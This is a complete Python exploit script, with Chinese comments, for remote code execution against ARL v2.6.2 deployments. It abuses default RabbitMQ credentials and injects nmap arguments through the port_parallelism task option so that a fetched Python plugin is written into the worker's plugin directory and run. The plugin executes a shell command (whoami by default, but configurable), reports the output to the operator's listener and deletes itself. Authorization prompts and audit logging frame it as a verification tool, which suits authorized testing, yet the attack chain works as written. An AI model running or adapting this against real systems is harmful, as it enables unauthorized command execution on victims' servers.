#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ARL v2.6.2 —— 最小化无害 RCE 验证（单脚本，单目标）

链路:
    RabbitMQ 默认口令 arl/arlpassword
      -> 向 arltask 投递 1 条 Celery 消息 (app.celerytask.arl_task)
      -> celery_action=ip_task，注入 port_parallelism 让 nmap 执行 http-fetch
      -> http-fetch 把本机托管的 .py 写进 NPoC 插件目录
      -> 同一条任务里的 poc_config 触发 load_plugins() -> exec_module()
      -> 插件执行 `whoami`，把输出回调到本脚本，然后自删

“无害”体现在:
    * 证明命令默认只有 whoami（--proof-cmd 可换，但请自己掂量）
    * 插件执行完自删，不在目标上留文件
    * 不写标记文件、不留后门、不做持久化、不做横向
    * 全部动作写进 evidence/rce_audit_*.jsonl

================================================================================
三种模式
================================================================================
  --check     只做前置探测：TCP + AMQP 认证 + 队列被动检查。
              不投递任何消息、不写插件、不执行命令。建议永远先跑这个。

  --dry-run   只打印将要投递的消息、等价 nmap 命令、插件源码。
              不连 broker。用来确认参数拼装正确（也顺带检查本脚本有没有写错）。

  默认        单条消息跑完整链，等 whoami 回调。

================================================================================
前置条件（缺一条就断，脚本会告诉你断在哪）
================================================================================
 1. 源码安装的 ARL（misc/setup-arl.sh 会停用防火墙，5672 默认对网络开放；
    Docker 的 compose 只发布 5003:443，5672 不出容器，这条链不适用）
 2. RabbitMQ 口令仍是 arl/arlpassword，vhost=arlv2host
 3. 执行机可直连 5672（AMQP 走不了 HTTP 代理，需要直连或 SSH 隧道）
 4. worker 能回连执行机的 HTTP 端口（--lhost 必须是 worker 路由得到的地址）
 5. worker 的 nmap 带 http-fetch.nse
 6. 插件目录存在且可写（worker 默认 root）

================================================================================
用法
================================================================================
  python arl_rce_verify.py --authorized "授权书号/时间窗" --rhost 10.0.0.5 --check

  python arl_rce_verify.py --authorized "..." --rhost 10.0.0.5 \
      --lhost 10.0.0.9 --dry-run

  python arl_rce_verify.py --authorized "..." --rhost 10.0.0.5 \
      --lhost 10.0.0.9 --scan-port 80 \
      --plugin-dir /opt/ARL-NPoC/xing/plugins

退出码: 0 成功 / 2 参数或授权 / 3 broker 或投递失败 / 4 未收到回调 / 5 前置条件不满足
"""

import argparse
import json
import os
import re
import secrets
import shlex
import socket
import sys
import tempfile
import threading
import time
from datetime import datetime
from http.server import BaseHTTPRequestHandler, SimpleHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import parse_qs, unquote_plus, urlsplit, urlunsplit

TASK_NAME = "app.celerytask.arl_task"
DEFAULT_QUEUE = "arltask"
DEFAULT_VHOST = "arlv2host"


# ===========================================================================
# 插件 payload
# ===========================================================================
PAYLOAD = r'''# -*- coding: utf-8 -*-
# 由 arl_rce_verify.py 生成。load_plugins() -> exec_module() 时执行顶层代码。
import os
import socket
import subprocess


def __arlv_proof():
    token = __TOKEN__
    cb = __CALLBACK__
    self_path = __SELF_PATH__

    out = ""
    try:
        raw = subprocess.check_output(__PROOF_CMD__, shell=True,
                                      stderr=subprocess.STDOUT, timeout=20)
        out = raw.decode("utf-8", "replace") if isinstance(raw, bytes) else str(raw)
    except Exception as exc:
        out = "exec-error: %r" % (exc,)

    try:
        hostname = socket.gethostname()
    except Exception:
        hostname = "?"

    if cb:
        try:
            import urllib.request
            from urllib.parse import urlencode as _ue
            query = _ue({"t": token, "h": hostname, "o": out.strip()[:1200]})
            urllib.request.urlopen(cb + "?" + query, timeout=10).read(64)
        except Exception:
            pass

    if self_path:
        try:
            os.remove(self_path)
        except Exception:
            pass


try:
    __arlv_proof()
except Exception:
    pass

# 仅为让 load_plugins 正常收尾
try:
    from xing.core import PluginType
except Exception:
    class PluginType(object):
        POC = "poc"


class Plugin(object):
    plugin_type = PluginType.POC
    app_name = "arlv"
    scheme = ["http"]
    vul_name = "arlv"

    def __init__(self):
        pass

    def verify(self, target):
        return []
'''


def build_payload(token, callback, self_path, proof_cmd):
    return (
        PAYLOAD.replace("__TOKEN__", repr(token))
        .replace("__CALLBACK__", repr(callback or ""))
        .replace("__SELF_PATH__", repr(self_path or ""))
        .replace("__PROOF_CMD__", repr(proof_cmd))
    )


# ===========================================================================
# 取证监听
# ===========================================================================
class Listener(object):
    """同时承担两件事：OOB 回调 + 目录列表（http-fetch 要抓目录）。"""

    def __init__(self, bind="0.0.0.0", port=0, directory="."):
        self._hits = []
        self._lock = threading.Lock()
        listener = self
        directory = os.path.abspath(directory)

        class Handler(SimpleHTTPRequestHandler):
            def __init__(self, *a, **kw):
                super().__init__(*a, directory=directory, **kw)

            def log_message(self, *args):
                return

            def _log(self, line):
                try:
                    with open(os.environ.get("ARLV_HITLOG", "/tmp/arlv_hits.log"), "a", encoding="utf-8") as _lf:
                        _lf.write(line + "\n")
                except Exception:
                    pass

            def do_GET(self):
                self._log("%s GET %s %s ua=%s host=%s" % (
                    datetime.now().strftime("%H:%M:%S"), self.client_address[0], self.path,
                    self.headers.get("User-Agent", "-"), self.headers.get("Host", "-")))
                parts = urlsplit(self.path)
                path = unquote_plus(parts.path)
                query = parse_qs(parts.query)
                if path.startswith("/c/"):
                    with listener._lock:
                        listener._hits.append({
                            "ts": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                            "token": path[3:] or (query.get("t") or [""])[0],
                            "client": "%s:%d" % self.client_address,
                            "host": (query.get("h") or [""])[0],
                            "out": (query.get("o") or [""])[0],
                        })
                    body = b"ok"
                    self.send_response(200)
                    self.send_header("Content-Type", "text/plain")
                    self.send_header("Content-Length", str(len(body)))
                    self.end_headers()
                    self.wfile.write(body)
                    return
                return super().do_GET()

        self._server = ThreadingHTTPServer((bind, port), Handler)
        self._server.daemon_threads = True
        self._started = False

    @property
    def port(self):
        return int(self._server.server_address[1])

    def start(self):
        threading.Thread(target=self._server.serve_forever, daemon=True).start()
        self._started = True
        return self

    def stop(self):
        if not self._started:
            return
        try:
            self._server.shutdown()
            self._server.server_close()
        except Exception:
            pass

    def hits(self, token=None):
        with self._lock:
            data = list(self._hits)
        if token is None:
            return data
        return [h for h in data if h["token"] == token]

    def wait(self, token, timeout, interval=2.0):
        deadline = time.monotonic() + max(0.0, timeout)
        while time.monotonic() < deadline:
            found = self.hits(token)
            if found:
                return found[0]
            time.sleep(interval)
        return None


# ===========================================================================
# 审计
# ===========================================================================
class Audit(object):
    def __init__(self, target, reference, evidence_dir):
        self.target = target
        self.reference = reference
        os.makedirs(evidence_dir, exist_ok=True)
        stamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.path = os.path.join(evidence_dir, "rce_audit_%s.jsonl" % stamp)

    def log(self, action, **fields):
        event = {
            "ts": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "target": self.target,
            "authorized": self.reference,
            "action": action,
        }
        event.update(fields)
        try:
            with open(self.path, "a", encoding="utf-8") as fh:
                fh.write(json.dumps(event, ensure_ascii=False) + "\n")
        except OSError:
            pass


# ===========================================================================
# broker
# ===========================================================================
def mask_broker(broker):
    try:
        p = urlsplit(broker)
        if p.password:
            return urlunsplit(
                (p.scheme, p.netloc.replace(p.password, "***"), p.path, p.query, p.fragment)
            )
    except Exception:
        pass
    return broker


def require_celery():
    try:
        import celery  # noqa: F401
        return True
    except ImportError:
        print("[!] 缺少依赖: pip install celery")
        return False


def new_app(broker):
    from celery import Celery

    app = Celery("arlv", broker=broker)
    app.conf.update(
        task_serializer="json",
        accept_content=["json"],
        result_backend=None,
        task_protocol=2,
        broker_connection_timeout=10,
    )
    return app


def preflight(broker, queue):
    """只做认证 + 队列被动检查，不投递。"""
    try:
        app = new_app(broker)
        with app.connection_for_write() as conn:
            conn.ensure_connection(max_retries=0, timeout=8)
            print("[PASS] AMQP 认证成功（arl/arlpassword 可用）")
            channel = conn.channel()
            try:
                channel.queue_declare(queue=queue, passive=True)
                print("[PASS] 队列 %s 存在" % queue)
            except Exception as exc:
                print("[WARN] 认证成功，但队列 %s 被动检查失败: %s" % (queue, exc))
                print("       worker 可能未启动；消息会堆在交换机上，投递仍可能成功。")
            finally:
                try:
                    channel.close()
                except Exception:
                    pass
        return True
    except Exception as exc:
        print("[FAIL] %s: %s" % (type(exc).__name__, exc))
        print("       常见原因：5672 未发布/不可达、口令已改、执行机连不上目标。")
        return False


# ===========================================================================
# 注入与消息
# ===========================================================================
def args_injection(plugin_dir, fetch_url="/"):
    """port_parallelism 注入。

    该值经 options -> PortScan(port_parallelism=...) -> " --min-parallelism {}"
    直接进 nmap 参数字符串，无类型校验、不经过 list(set(...))，顺序确定；
    且拼接位置在 --script-timeout 6s 之后，末尾再给 300s 可覆盖。
    """
    return (
        "32 --script http-fetch "
        "--script-args http-fetch.destination={d},http-fetch.url={u} "
        "--script-timeout 300s"
    ).format(d=plugin_dir, u=fetch_url)


def target_injection(scan_ip, plugin_dir, fetch_url="/"):
    """报告原始的 target 注入。会被 portScan.py:116 的 list(set()) 打乱，约 5% 成功。"""
    return (
        "{ip} --script http-fetch "
        "--script-args http-fetch.destination={d},http-fetch.url={u}"
    ).format(ip=scan_ip, d=plugin_dir, u=fetch_url)


def message(target, task_id, options):
    return {
        "celery_action": "ip_task",
        "data": {"target": target, "task_id": task_id, "options": options},
    }


def show_nmap(scan_ip, scan_port, plugin_dir, vector, fetch_url="/"):
    h_args = [scan_ip] if vector == "args" else shlex.split(
        target_injection(scan_ip, plugin_dir, fetch_url)
    )
    # 与 PortScan.__init__ 的拼接顺序一致：-sV 在 --open 之后、-Pn 之前
    f_args = ["-sT", "-n", "--open", "-sV", "-Pn", "--max-rtt-timeout", "800ms",
              "--min-rate", "64", "--script-timeout", "6s",
              "--max-hostgroup", "32", "--host-timeout", "600s"]
    if vector == "args":
        # 真实拼接是 " --min-parallelism {}".format(注入串)，回显必须带上这个前缀
        f_args += ["--min-parallelism"] + shlex.split(args_injection(plugin_dir, fetch_url))
    else:
        f_args += ["--min-parallelism", "32"]
    f_args += ["--max-retries", "3"]
    return " ".join(["nmap", "-oX", "-"] + h_args + ["-p", str(scan_port)] + f_args)


# ===========================================================================
# main
# ===========================================================================
def main(argv=None):
    ap = argparse.ArgumentParser(
        description="ARL 最小化无害 RCE 验证（单目标，whoami 取证）",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    ap.add_argument("--authorized", required=True,
                    help="授权说明：项目名/授权书号/时间窗（必填，写入审计）")
    ap.add_argument("--rhost", required=True, help="RabbitMQ 主机，单个")
    ap.add_argument("--rport", type=int, default=5672)
    ap.add_argument("--user", default="arl")
    ap.add_argument("--password", default="arlpassword")
    ap.add_argument("--vhost", default=DEFAULT_VHOST)
    ap.add_argument("--queue", default=DEFAULT_QUEUE)
    ap.add_argument("--rabbit", help="完整 broker URL，覆盖上面的分项")

    ap.add_argument("--lhost", help="执行机在 worker 侧可达的 IP（payload 服务与扫描目标）")
    ap.add_argument("--listen-port", type=int, default=80)
    ap.add_argument("--scan-port", type=int, default=80)
    ap.add_argument("--fetch-url", default=None,
                    help="http-fetch.url；默认自动用 /<payload>.py 直取单文件（比爬目录兼容性更好），传 / 走目录爬取")
    ap.add_argument("--plugin-dir", default="/opt/ARL-NPoC/xing/plugins",
                    help="worker 上的 NPoC 插件目录（Docker 用 .../plugins/upload_poc）")

    ap.add_argument("--proof-cmd", default="whoami",
                    help="在 worker 上执行的证明命令，默认 whoami；输出经回调带回")
    ap.add_argument("--vector", choices=["args", "target"], default="args",
                    help="注入原语：args=port_parallelism（默认，确定性）；"
                         "target=报告原始写法（约 5%）")
    ap.add_argument("--task-id", default="0" * 24, help="24 位 ObjectId，ip_task 不校验存在性")
    ap.add_argument("--two-messages", action="store_true",
                    help="改回两条消息（写盘 / 触发），默认单条")

    ap.add_argument("--check", action="store_true", help="只做前置探测，不投递")
    ap.add_argument("--dry-run", action="store_true", help="只打印，不连 broker")
    ap.add_argument("--wait", type=float, default=180.0, help="等待回调的秒数")
    ap.add_argument("--evidence-dir", default=None)

    args = ap.parse_args(argv)

    # ------------------------------------------------------------ 闸门
    if not args.authorized.strip():
        print("[!] --authorized 不能为空。")
        return 2
    if re.search(r"[,;\s]", args.rhost.strip()):
        print("[!] --rhost 只接受单个主机，疑似清单: %r" % args.rhost)
        return 2
    if len(args.task_id) != 24:
        print("[!] --task-id 必须是 24 位十六进制字符串。")
        return 2
    if not args.check and not args.lhost:
        print("[!] 完整模式必须提供 --lhost。")
        return 2
    if not args.check and args.listen_port != args.scan_port:
        print("[!] --listen-port 与 --scan-port 必须一致（http-fetch 抓的是同一端口）。")
        return 2
    if not args.dry_run and not require_celery():
        return 2

    broker = args.rabbit or "amqp://%s:%s@%s:%d/%s" % (
        args.user, args.password, args.rhost, args.rport, args.vhost
    )
    here = os.path.dirname(os.path.abspath(__file__))
    evidence_dir = args.evidence_dir or os.path.join(here, "evidence")
    audit = Audit("%s (%s)" % (args.rhost, args.queue), args.authorized, evidence_dir)

    print("=" * 70)
    print("授权 : %s" % args.authorized)
    print("目标 : %s  (broker %s)" % (args.rhost, mask_broker(broker)))
    print("审计 : %s" % audit.path)
    print("=" * 70)

    # ------------------------------------------------------------ check
    if args.check:
        audit.log("preflight", broker=mask_broker(broker), queue=args.queue)
        ok = preflight(broker, args.queue)
        audit.log("preflight_result", ok=ok)
        print("[*] --check 结束：未投递消息、未写插件、未执行命令。")
        return 0 if ok else 5

    # ------------------------------------------------------------ 准备
    suffix = os.environ.get("ARLV_TOKEN_SUFFIX") or secrets.token_hex(4)
    token = "v" + suffix
    payload_name = "arlv_%s.py" % suffix
    plugin_path = "%s/%s/%d/%s" % (
        args.plugin_dir.rstrip("/"), args.lhost, args.scan_port, payload_name
    )

    # 回调地址由 --listen-port 决定，无需先绑定端口
    callback = "http://%s:%d/c/%s" % (args.lhost, args.listen_port, token)
    workdir = tempfile.mkdtemp(prefix="arlv_")
    payload_path = os.path.join(workdir, payload_name)
    with open(payload_path, "w", encoding="utf-8") as fh:
        fh.write(build_payload(token, callback, plugin_path, args.proof_cmd))

    # 默认直取 payload 文件本身：部分 nmap 构建下目录爬取不会跟进链接
    # （实测 Windows Server 版会爬，WSL 里的构建只取 / 就停）
    fetch_url = args.fetch_url or ("/" + payload_name)

    audit.log("payload_built", payload=payload_name, plugin_path=plugin_path,
              proof_cmd=args.proof_cmd, fetch_url=fetch_url)

    # ------------------------------------------------------------ 消息
    options = {
        "port_scan": True,
        "port_scan_type": "custom",
        "port_custom": str(args.scan_port),
        # 必须 True：nmap 的静态服务表会把非标准端口猜成别的名字
        # （实测 8899→ospf-lite、18080→unknown），此时 shortport.http 不匹配，
        # http-fetch 根本不会执行。-sV 让 nmap 实探一次并标成 http(probed) 才触发。
        "service_detection": True,
        "poc_config": [],
    }
    target = args.lhost
    if args.vector == "args":
        options["port_parallelism"] = args_injection(args.plugin_dir, fetch_url)
    else:
        target = target_injection(args.lhost, args.plugin_dir, fetch_url)

    if args.two_messages:
        msg1 = message(target, args.task_id, options)
        msg2 = message("127.0.0.1", args.task_id, {
            "port_scan": False, "service_detection": False,
            "poc_config": [{"enable": True, "plugin_name": "arlv_" + suffix}],
        })
    else:
        options["poc_config"] = [{"enable": True, "plugin_name": "arlv_" + suffix}]
        msg1 = message(target, args.task_id, options)
        msg2 = None

    print("[*] 模式   : %s" % ("两条消息" if msg2 else "单条消息（写盘+触发同一任务）"))
    print("[*] 注入   : %s" % ("port_parallelism（确定）" if args.vector == "args"
                               else "target（约 5%，仅复现报告）"))
    print("[*] target : %s" % target)
    print("[*] 插件   : %s" % plugin_path)
    print("[*] 证明   : %s" % args.proof_cmd)
    print("[*] 回调   : %s" % callback)
    print("[*] nmap   : %s" % show_nmap(args.lhost, args.scan_port, args.plugin_dir, args.vector, fetch_url))

    if args.dry_run:
        print("\n[dry-run] 消息 1:")
        print(json.dumps(msg1, ensure_ascii=False, indent=2))
        if msg2:
            print("\n[dry-run] 消息 2:")
            print(json.dumps(msg2, ensure_ascii=False, indent=2))
        print("\n[dry-run] 插件源码:")
        print(build_payload(token, callback, plugin_path, args.proof_cmd))
        audit.log("dry_run")
        return 0

    # ------------------------------------------------------------ 监听
    try:
        listener = Listener(bind="0.0.0.0", port=args.listen_port,
                            directory=workdir).start()
    except OSError as exc:
        print("[!] 无法在 %d 监听: %s" % (args.listen_port, exc))
        print("    80 端口通常需要 root；可改 --listen-port 8080 --scan-port 8080。")
        return 2

    # ------------------------------------------------------------ 投递
    audit.log("send", messages=2 if msg2 else 1, target=target)
    try:
        app = new_app(broker)
        r1 = app.send_task(TASK_NAME, kwargs={"options": msg1}, queue=args.queue)
        print("[+] 消息 1 已投递: %s" % r1.id)
    except Exception as exc:
        print("[!] 投递失败: %s: %s" % (type(exc).__name__, exc))
        listener.stop()
        audit.log("send_failed", error=str(exc))
        return 3

    if msg2:
        print("[*] 等待 nmap + http-fetch（60s）...")
        time.sleep(60)
        try:
            r2 = app.send_task(TASK_NAME, kwargs={"options": msg2}, queue=args.queue)
            print("[+] 消息 2 已投递: %s" % r2.id)
        except Exception as exc:
            print("[!] 消息 2 投递失败: %s: %s" % (type(exc).__name__, exc))
            listener.stop()
            audit.log("send2_failed", error=str(exc))
            return 3

    # ------------------------------------------------------------ 取证
    print("[*] 等待 %s 的回调（最多 %.0fs）..." % (args.proof_cmd, args.wait))
    hit = listener.wait(token, args.wait)

    print()
    if hit:
        print("=" * 70)
        print("[CONFIRMED] 目标 worker 已执行代码")
        print("  时间   : %s" % hit["ts"])
        print("  来源   : %s" % hit["client"])
        print("  主机名 : %s" % (hit["host"] or "?"))
        print("  命令   : %s" % args.proof_cmd)
        print("  输出   : %s" % (hit["out"] or "<空>"))
        print("=" * 70)
        audit.log("confirmed", client=hit["client"], hostname=hit["host"],
                  proof_cmd=args.proof_cmd, output=hit["out"])
        code = 0
    else:
        print("[UNCONFIRMED] 未收到回调。按顺序排查：")
        print("  1) --check 是否通过（5672 认证）")
        print("  2) worker 能否访问 http://%s:%d/（目录列表）" % (args.lhost, args.listen_port))
        print("  3) 插件目录可写？ ls -ld %s" % args.plugin_dir)
        print("  4) 插件是否落盘？ ls -R %s/%s" % (args.plugin_dir, args.lhost))
        print("  5) worker 日志：nmap 报错 / load plugin error / NPoC")
        print("  6) nmap 带 http-fetch？ nmap --script-help http-fetch")
        print("  7) --lhost 是否被 BLACK_IPS 拦（默认只拦 127/8 与 0/8）")
        print("  8) 单条消息模式失败时，试 --two-messages")
        audit.log("unconfirmed")
        code = 4

    print()
    print("[i] 目标侧残留：插件已自删；但 worker 会把 %s 当作发现的站点"
          "写入 site 集合（一条记录，删不掉）。" % args.lhost)
    print("[i] 清空插件目录确认: ls -R %s/%s" % (args.plugin_dir, args.lhost))

    listener.stop()
    return code


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print("\n[!] 中断", file=sys.stderr)
        sys.exit(130)
